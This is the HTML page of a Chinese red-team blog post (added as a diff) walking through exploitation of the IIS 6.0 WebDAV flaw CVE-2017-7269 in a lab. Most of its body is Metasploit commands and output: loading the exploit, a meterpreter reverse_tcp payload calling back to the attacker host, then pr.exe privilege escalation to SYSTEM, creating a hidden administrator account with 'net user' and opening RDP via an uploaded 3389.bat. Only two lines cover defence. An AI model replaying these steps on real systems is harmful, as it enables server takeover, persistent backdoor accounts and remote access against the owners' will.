@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>IIS-远程代码执行漏洞 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">IIS-远程代码执行漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 3, 2019&nbsp;&nbsp;11:25:25</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29794354&auto=1&height=66"></iframe>
+
+<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>开启<code>WebDAV</code>服务的<code>IIS 6.0</code>被爆存在<code>缓存区溢出漏洞</code>导致远程代码执行，目前针对<code>Windows Server 2003 R2</code>可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>影响产品：<code>Microsoft Windows Server 2003 R2</code> 开启<code>WebDAV</code>服务的IIS6.0（目前已验证，其他版本尚未验证）</p>
+<p>触发函数：<code>ScStoragePathFromUrl</code>函数</p>
+<p>附加信息：<code>ScStoragePathFromUrl</code>函数被调用了两次</p>
+<p>漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>必须确保Kali Linux 和 Windows 2003 能够相互Ping通，IIS6.0,必须开启了WebDAV</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003 R2 32位 作为服务器 （IIS6.0，开启了WebDAV）</span><br><span class="line">Kali Linux 作为攻击主机</span><br></pre></td></tr></table></figure>
+
+<p>在这里，我用到的网络连接方式是<code>NET</code>模式：用于共享主机的IP地址</p>
+<p>Kali Linux 的 IP是：<code>192.168.119.136</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/180.png" alt="图片"></p>
+<p>Windows 2003 的 IP是：<code>192.168.119.134</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/181.png" alt="图片"></p>
+<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>下载<code>cve-2017-7269</code>漏洞利用脚本</p>
+<p>IIS代码执行脚本 - cve-2017-7269：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/cve-2017-7269">下载链接</a></p>
+<p>下载好了，吧<code>exp</code>复制到kali的这个目录下：</p>
+<blockquote>
+<p>/usr/share/metasploit-framework/modules/exploits/windows/iis</p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/182.png" alt="图片"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动Metasploit</span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">使用cve-2017-7269这个攻击载荷</span><br><span class="line">use exploit/windows/iis/cve-2017-7269</span><br><span class="line"></span><br><span class="line">查看有哪些参数需要设置</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/183.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">设置被攻击者（windows_2003）的IP</span><br><span class="line">set RHOST 192.168.119.134</span><br><span class="line"></span><br><span class="line">设置服务器的地址（Windows_2003）</span><br><span class="line">set HttpHost 192.168.119.134</span><br><span class="line"></span><br><span class="line">设置Kali的IP地址</span><br><span class="line">set LHOST 192.168.119.136</span><br><span class="line"></span><br><span class="line">设置Payload返回载荷</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>设置完之后就可以看到我们设置的参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/iis/cve-2017-7269) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/cve-2017-7269):</span><br><span class="line"></span><br><span class="line">   Name                Current Setting  Required  Description</span><br><span class="line">   ----                ---------------  --------  -----------</span><br><span class="line">   HttpHost            192.168.119.134  yes       http host for target</span><br><span class="line">   PhysicalPathLength  19               yes       length of physical path for target(include backslash)</span><br><span class="line">   RHOST               192.168.119.134  yes       The target address</span><br><span class="line">   RPORT               80               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.119.136  yes       The listen address</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows Server 2003 R2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/184.png" alt="图片"></p>
+<p>设置完之后，我们就可以使用命令：<code>exploit</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/185.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/iis/cve-2017-7269) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.119.134</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.119.136:4444 -&gt; 192.168.119.134:1031) at 2019-08-03 14:14:40 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<p>这个时候就可以执行<code>shell</code>命令了~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">[-] Failed to spawn shell with thread impersonation. Retrying without it.</span><br><span class="line">Process 2044 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 5.2.3790]</span><br><span class="line">(C) ��Ȩ���� 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看当前的权限：<code>whoami</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>network service</code>是一个一般用户的权限</p>
+<h2 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h2><p>使用<code>Metasploit</code>对<code>Windows-2003</code>进行提权:</p>
+<blockquote>
+<p>用到pr.exe提权exp</p>
+</blockquote>
+<p>首先使用<code>shell</code>命令看看能不能创建文件夹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;md 123</span><br><span class="line">md 123</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/186.png" alt="图片"></p>
+<p>很显然不能，那么我们切换到<code>C</code>盘下再试试：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/187.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;md 123</span><br><span class="line">md 123</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 88DC-ADF2</span><br><span class="line"></span><br><span class="line"> C:\ 的目录</span><br><span class="line"></span><br><span class="line">2019-08-05  13:42    &lt;DIR&gt;          123</span><br><span class="line">2019-08-03  12:18                 0 AUTOEXEC.BAT</span><br><span class="line">2019-08-03  12:18                 0 CONFIG.SYS</span><br><span class="line">2019-08-03  12:22    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">2019-08-03  14:02    &lt;DIR&gt;          Inetpub</span><br><span class="line">2019-08-03  12:23    &lt;DIR&gt;          Program Files</span><br><span class="line">2019-08-03  14:02    &lt;DIR&gt;          WINDOWS</span><br><span class="line">2019-08-03  12:18    &lt;DIR&gt;          wmpub</span><br><span class="line">               2 个文件              0 字节</span><br><span class="line">               6 个目录 22,927,130,624 可用字节</span><br><span class="line"></span><br><span class="line">C:\&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个时候是可以创建文件夹<code>123</code>，但是权限还是很小，只是一个服务器权限。</p>
+<p>我们回到会话窗口:<code>exit</code></p>
+<p>使用<code>upload</code>命令在<code>home</code>目录上传<code>pr.exe</code>提权exp文件到<code>2003</code>服务器的<code>C:\\123</code>目录下：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/188.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/189.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> : /home/pr.exe -&gt; c:\123</span><br><span class="line">[*] uploaded   : /home/pr.exe -&gt; c:\123\pr.exe</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<p><code>meterpreter</code>提示上传成功！我们切换到<code>shell</code>会话<code>C</code>盘下的<code>123</code>目录，看看<code>pr.exe</code>是否上传成功：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/190.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;dir</span><br><span class="line">dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 88DC-ADF2</span><br><span class="line"></span><br><span class="line"> C:\123 的目录</span><br><span class="line"></span><br><span class="line">2019-08-05  13:47    &lt;DIR&gt;          .</span><br><span class="line">2019-08-05  13:47    &lt;DIR&gt;          ..</span><br><span class="line">2019-08-05  13:47            73,728 pr.exe</span><br><span class="line">               1 个文件         73,728 字节</span><br><span class="line">               2 个目录 22,927,056,896 可用字节</span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功上传<code>pr.exe</code>文件！我们首先执行一下<code>whoami</code>看看当前权限：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/191.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br></pre></td></tr></table></figure>
+
+<p>权限很小！我们用<code>pr.exe</code>执行<code>whoami</code>看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/192.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe whoami</span><br><span class="line">pr.exe whoami</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<p>这个时候就是一个系统管理权限:<code>nt authority\system</code>!</p>
+<h3 id="创建一个用户并提升为超级管理员权限"><a href="#创建一个用户并提升为超级管理员权限" class="headerlink" title="创建一个用户并提升为超级管理员权限"></a>创建一个用户并提升为超级管理员权限</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/193.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe &quot;net user liuwx liuwx123abc /add&quot;</span><br><span class="line">pr.exe &quot;net user liuwx liuwx123abc /add&quot;</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure>
+
+<p>吧<code>liuwx</code>用户添加进<code>管理员</code>组：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/194.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe &quot;net localgroup administrators liuwx /add&quot;</span><br><span class="line">pr.exe &quot;net localgroup administrators liuwx /add&quot;</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们已经添加了一个超级管理员的账号，这个时候我们要使用刚刚创建的账号进行远程登录它的那台服务器，前提是对方服务器开启了<code>3389</code>端口.</p>
+<h3 id="开启3389登录服务器"><a href="#开启3389登录服务器" class="headerlink" title="开启3389登录服务器"></a>开启3389登录服务器</h3><p>查看当前端口开放情况：</p>
+<p><code>netstat -an</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/195.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;netstat -an </span><br><span class="line">netstat -an</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:139    0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:1046   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  TCP    192.168.119.134:1047   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  UDP    0.0.0.0:445            *:*                    </span><br><span class="line">  UDP    0.0.0.0:500            *:*                    </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                    </span><br><span class="line">  UDP    127.0.0.1:123          *:*                    </span><br><span class="line">  UDP    192.168.119.134:123    *:*                    </span><br><span class="line">  UDP    192.168.119.134:137    *:*                    </span><br><span class="line">  UDP    192.168.119.134:138    *:*                    </span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从上面可以看到，它没有开放<code>3389</code>端口！我们是不能够进行远程链接到2003主机的。</p>
+<p>这个时候就要用到<code>3389</code>批处理工具：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/196.png" alt="图片"></p>
+<p>吧<code>3389.bat</code>文件上传到<code>c:\\123</code>目录中：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/197.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x27;/home/3389.bat&#x27; c:\\123</span><br><span class="line">[*] uploading  : /home/3389.bat -&gt; c:\123</span><br><span class="line">[*] uploaded   : /home/3389.bat -&gt; c:\123\3389.bat</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/198.png" alt="图片"></p>
+<p>成功上传！这个时候，我们就需要用<code>3389</code>这个提权工具开启远程服务器的<code>3389</code>端口：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/199.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe 3389.bat</span><br><span class="line">pr.exe 3389.bat</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 2640 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提示你：3389已经开启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;netstat -an</span><br><span class="line">netstat -an</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:139    0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:1047   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  UDP    0.0.0.0:445            *:*                    </span><br><span class="line">  UDP    0.0.0.0:500            *:*                    </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                    </span><br><span class="line">  UDP    127.0.0.1:123          *:*                    </span><br><span class="line">  UDP    192.168.119.134:123    *:*                    </span><br><span class="line">  UDP    192.168.119.134:137    *:*                    </span><br><span class="line">  UDP    192.168.119.134:138    *:*                    </span><br><span class="line">本机的IP是192.168.119.134</span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候，服务器的<code>3389</code>服务就已经被开启了！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/200.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/201.png" alt="图片"></p>
+<p>这个就是整个提权的一个过程，包括成功的登陆到远程服务器！</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、关闭<code>WebDAV</code>服务</p>
+<p>2、使用相关防护设备</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/08/03/IIS-3/">http://example.com/2019/08/03/IIS-3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
